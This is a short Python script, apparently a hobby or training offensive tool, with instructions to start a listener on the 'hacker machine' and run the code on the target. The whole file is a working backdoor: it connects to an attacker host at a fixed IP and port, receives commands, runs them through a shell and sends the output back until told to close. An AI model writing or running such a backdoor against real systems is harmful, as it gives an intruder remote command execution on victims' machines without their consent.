#!/usr/bin/env python3
'''
Do this on hacker machine:
run executeCommandServer.py -p 4444
netcat verbose listen port 4444
Run this code on the target:
'''
import socket
import subprocess
from backdoor import Backdoor

def execute_command(command):
    output = subprocess.check_output(command, shell=True)
    return output

backdoor = Backdoor("192.168.1.197", 4444)
response_json = backdoor.recv_json(1024)
while (True):
    if "close" in response_json:
        break
    try:
        output = execute_command(response_json.strip())
        backdoor.send_json(output.decode("utf-8"))
    except:
        backdoor.send_json("This command is not recognized")
    response_json = backdoor.recv_json(1024)

backdoor.close()